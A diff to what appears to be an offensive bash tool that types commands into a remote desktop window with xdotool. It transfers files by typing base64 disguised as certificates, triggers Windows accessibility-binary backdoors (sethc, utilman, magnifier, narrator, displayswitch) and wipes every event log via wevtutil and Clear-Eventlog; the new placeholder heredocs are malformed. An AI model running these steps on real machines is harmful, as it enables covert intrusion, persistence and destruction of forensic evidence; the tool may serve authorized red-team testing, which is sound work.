@@ -275,14 +275,14 @@ function PowershellOutFile {
         elif [ "$mode" = "certutil" ]
         then
             print_status "progress" "Transferring file..."
-            file=$(base64 -w 64 "$input")
+            base64_string=$(base64 -w 64 "$input")
             xdotool_return_input "@'" "return"
             xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
             
-            while read -r line
+            while IFS= read -r line
             do
                 xdotool_return_input "$line" "return"
-            done <<< "$file"
+            done <<< "$base64_string"
             
             xdotool_return_input "-----END CERTIFICATE-----" "return"
             xdotool_return_input "'@ | Out-File ${random_temp}" "return"
@@ -346,7 +346,6 @@ function CopyCon {
     then
         # TODO: Ensure it works
         print_status "progress" "Transferring file..."
-        # TODO: replace temp.txt to randomize function
         xdotool_return_input "copy con ${random_temp}" "return"
         xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
         
@@ -375,6 +374,11 @@ function CopyCon {
 function CreateUser {
     local mode=$1
     local platform=$2
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
+
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
     if [ "$platform" = "windows" ]
@@ -384,11 +388,23 @@ function CreateUser {
     then
         echo "Linux"
     fi
+
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"   
+    else
+        print_status "error" "Invalid mode!"
+    fi
 }
 
 function StickyKey {
     local mode=$1
     local platform=$2
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
+
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
     if [ "$platform" != "windows" ]
@@ -397,47 +413,86 @@ function StickyKey {
         exit 1
     fi
 
-    print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
-    xdotool_return_input "shift shift shift shift shift" "custom"
-    print_status "completed" "Backdoor Activated!"
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"
+    elif [ "$mode" = "backdoor" ]
+    then
+        print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
+        xdotool_return_input "shift shift shift shift shift" "custom"
+        print_status "completed" "Backdoor Activated!"
+    else
+        print_status "error" "Invalid mode!"
+    fi
 }
 
 function UtilityManager {
     local mode=$1
     local platform=$2
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
+
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
     if [ "$platform" != "windows" ]
     then
-        echo "[-] Registry keys only exists on Windows operating system user!"
+        print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
 
-    print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
-    xdotool_return_input "Super+u" "custom"
-    print_status "completed" "Backdoor Activated!"
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"
+    elif [ "$mode" = "backdoor" ]
+    then
+        print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
+        xdotool_return_input "Super+u" "custom"
+        print_status "completed" "Backdoor Activated!"
+    else
+        print_status "error" "Invalid mode!"
+    fi
 }
 
 function Magnifier {
     local mode=$1
     local platform=$2
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
+
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
     if [ "$platform" != "windows" ]
     then
-        echo "[-] Registry keys only exists on Windows operating system user!"
+        print_status "error" "Registry keys only exists on Windows operating system user!"
         exit 1
     fi
-
-    print_status "progress" "Activating magnifier.exe backdoor..."
-    xdotool_return_input "Super+equal" "custom"
-    xdotool_return_input "Super+minus" "custom"
-    print_status "completed" "Backdoor Activated!"
+    
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"
+    elif [ "$mode" = "backdoor" ]
+    then
+        print_status "progress" "Activating magnifier.exe backdoor..."
+        xdotool_return_input "Super+equal" "custom"
+        xdotool_return_input "Super+minus" "custom"
+        print_status "completed" "Backdoor Activated!"
+    else
+        print_status "error" "Invalid mode!"
+    fi
 }
 
 function Narrator {
     local mode=$1
     local platform=$2
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
+
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
     if [ "$platform" != "windows" ]
@@ -446,14 +501,27 @@ function Narrator {
         exit 1
     fi
 
-    print_status "progress" "Activating narrator.exe backdoor..."
-    xdotool_return_input "Super+Return" "custom"
-    print_status "completed" "Backdoor Activated!"
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"
+    elif [ "$mode" = "backdoor" ]
+    then
+        print_status "progress" "Activating narrator.exe backdoor..."
+        xdotool_return_input "Super+Return" "custom"
+        print_status "completed" "Backdoor Activated!"
+    else
+        print_status "error" "Invalid mode!"
+    fi
 }
 
 function DisplaySwitch {
     local mode=$1
     local platform=$2
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
+
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
     if [ "$platform" != "windows" ]
@@ -462,9 +530,17 @@ function DisplaySwitch {
         exit 1
     fi
 
-    print_status "progress" "Activating displayswitch.exe backdoor..."
-    xdotool_return_input "Super+p" "custom"
-    print_status "completed" "Backdoor Activated!"
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"
+    elif [ "$mode" = "backdoor" ]
+    then
+        print_status "progress" "Activating displayswitch.exe backdoor..."
+        xdotool_return_input "Super+p" "custom"
+        print_status "completed" "Backdoor Activated!"
+    else
+        print_status "error" "Invalid mode!"
+    fi
 }
 
 function Persistence {
@@ -513,8 +589,15 @@ function PrivEsc {
 
 function WevUtil {
     local mode=$1
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
 
-    if [ "$mode" = "execute" ]
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"
+    elif [ "$mode" = "execute" ]
     then
         Execute "for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
     elif [ "$mode" = "script" ]
@@ -529,8 +612,15 @@ function WevUtil {
 
 function WinEvent {
     local mode=$1
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
 
-    if [ "$mode" = "execute" ]
+    if [ "$mode" = "info" ]
+    then
+        echo "$description"
+    elif [ "$mode" = "execute" ]
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm"
     elif [ "$mode" = "script" ]
@@ -545,6 +635,10 @@ function WinEvent {
 
 function EventViewer {
     local mode=$1
+    local description=$(cat <<<EOF
+"Fill in the description of the technique"
+EOF
+)
 
     if [ "$mode" = "info" ]
     then
@@ -691,7 +785,7 @@ function main() {
         exit 1
     fi
 
-    # Select Remote Desktop Program to match the window name
+    # Select graphical remote program to match the window name
     if [ "$WINDOWNAME" = "freerdp" ]
     then
         WINDOWNAME="FreeRDP"
@@ -736,21 +830,21 @@ function main() {
         OutputRemoteFile "$INPUT" "$OUTPUT" "$PLATFORM" "$METHOD"
     fi
 
-    # Privilege Escalation method
+    # Privilege Escalation
     if [[ -n "$ELEVATE" && -n "$METHOD" ]]
     then
         # -e info -p <windows | linux> -m bypassuac
         PrivEsc "$ELEVATE" "$PLATFORM" "$METHOD"
     fi
 
-    # Persistence method
+    # Persistence
     if [[ -n "$SELECT" && -n "$METHOD" ]]
     then
         # -s <info | backdoor> -p <windows | linux> -m <persistence_method>
         Persistence "$SELECT" "$PLATFORM" "$METHOD"
     fi
 
-    # Antiforensics method
+    # Antiforensics
     if [[ -n "$ANTIFORENSICS" && -n "$METHOD" ]]
     then
         # -a <info | execute> -p <windows | linux> -m <antiforensics_method>
